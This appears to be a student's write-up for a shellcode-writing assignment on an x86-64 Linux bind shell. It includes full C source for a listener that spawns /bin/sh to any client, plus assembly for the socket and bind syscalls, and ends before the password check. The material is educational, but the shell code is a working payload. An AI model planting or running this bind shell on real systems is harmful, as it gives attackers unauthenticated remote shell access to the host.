Assignment #1 – Bind shell with password
========================================

The objective of this assignment was to create a shellcode that binds to a port and, if provided with the correct password, spawns a shell. The final shellcode must not have any null bytes.

Writing the bind shell
----------------------

I started by writing the bind shell itself, with no password. To do this it's easier to start from a C version like the one below. This code has no error checking at all; and the shellcode won't have either.

    #include <stdlib.h>
    #include <unistd.h>
    #include <strings.h>
    #include <sys/socket.h>
    #include <arpa/inet.h>

    int main(int argc, char **argv)
    {
        struct sockaddr_in server;
        int sock, new;
        char *arguments[] = {"/bin/sh", 0};
        
        sock = socket(AF_INET, SOCK_STREAM, 0);

        server.sin_family = AF_INET;
        server.sin_port = htons(atoi(argv[1]));
        server.sin_addr.s_addr = INADDR_ANY;
        bzero(&server.sin_zero, 8);

        bind(sock, (struct sockaddr *)&server, sizeof(server));
        listen(sock, 2);
        new = accept(sock, NULL, NULL);
        close(sock);

        dup2(new, 0);
        dup2(new, 1);
        dup2(new, 2);

        execve(arguments[0], arguments, NULL);
    }

Breaking it down we have seven parts:

  1. `socket()`. Create a socket to use in communications
  1. `bind()`. Bind a socket to an address
  1. `listen()`. Mark the socket as being able to accept incoming connections
  1. `accept()`. Accept connection requests and create new sockets
  1. `close()`. Close the listening socket
  1. `dup2()`. Duplicate file descriptors to connect `stdin`, `stdout` and `stderr` to the incoming connection
  1. `execve()`. Replace the current process image with `/bin/sh`

With the C code as reference each os these parts was implemented in assembly as follows.

### `socket()`

You need to call [`syscall(2)`][man_2_syscall] with the appropriate arguments. To figure out the values of the macros `AF_INET` and `SOCK_STREAM` you can use Python:

    $ python3
    >>>
    >>> import socket
    >>> socket.AF_INET
    <AddressFamily.AF_INET: 2>
    >>> socket.SOCK_STREAM
    <SocketKind.SOCK_STREAM: 1>

The numbers for syscalls can be found in `/usr/include/asm/unistd_64.h`. From that file we know `socket` corresponds to syscall 41.

    ...
    #define __NR_socket 41
    #define __NR_connect 42
    #define __NR_accept 43
    ...

You can a syscall by putting its number in RAX and its arguments in RDI, RSI, RDX, R10, R8, R9, in that order. Lastly you can the syscall with the `syscall` instruction. The return value of the syscall is stored in RAX. With all this information we are able to write the following code.

    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; __NR_socket = 41

    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall

    mov rdi, rax

### `bind()`

Calling [`bind(2)`][man_2_bind] is probably the part of this shellcode most prone to confusion. The first argument is the ID (know as "file descriptor") of the socket created by `socket`.

The second argument is a pointer to a structure of the type `sockaddr_in`. So you need to create this structure in memory and then get a pointer to it. To understand this structure [Beej's Guide to Network Programming][beej_sockaddr_in] is a valuable resource. We see `sockaddr_in` is defined as follows:

    struct sockaddr_in {
        short            sin_family;
        unsigned short   sin_port;
        struct in_addr   sin_addr;
        char             sin_zero[8];
    };

This definition lets you know the memory layout for the structure. `sin_family` and `sin_port` are `short` which correspond to 16 bits. `sin_addr` is a `struct in_addr` which from Beej's Guide you can see corresponds to a `long`, i.e. 32 bits. And lastly `sin_zero` is an 8-`char` array, or 64 bits in total. So the memory layout of `sockaddr_in` can be represented as follows:

    +---+---+---+---+---+---+---+---+     
    |   sin_family  |   sin_port    |    ↑ lower addresses
    +---+---+---+---+---+---+---+---+    |
    |           sin_addr            |    |
    +---+---+---+---+---+---+---+---+    | stack
    |         sin_zero[0-3]         |    |
    +---+---+---+---+---+---+---+---+    |
    |         sin_zero[4-7]         |    | higher addresses
    +---+---+---+---+---+---+---+---+     

    ; server.sin_family = AF_INET;    short
    ; server.sin_port = htons(4444);    unsigned short
    ; server.sin_addr.s_addr = INADDR_ANY;    unsigned long
    ; bzero(&server.sin_zero, 8);
    ;
    ; https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
    ; struct sockaddr_in {
    ;     short            sin_family;
    ;     unsigned short   sin_port;
    ;     struct in_addr   sin_addr;
    ;     char             sin_zero[8];
    ; };
    ;
    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
    ; INADDR_ANY = 0
    ; AF_INET = 2
    ; __NR_bind = 49

    xor rax, rax
    push rax
    mov dword [rsp-4], eax
    sub rsp, 4
    push word 0x5c11  ; htons(4444)
    push word 2

    ; bind
    mov rax, 49
    mov rsi, rsp
    mov rdx, 16  ; sizeof(sockaddr_in)
    syscall
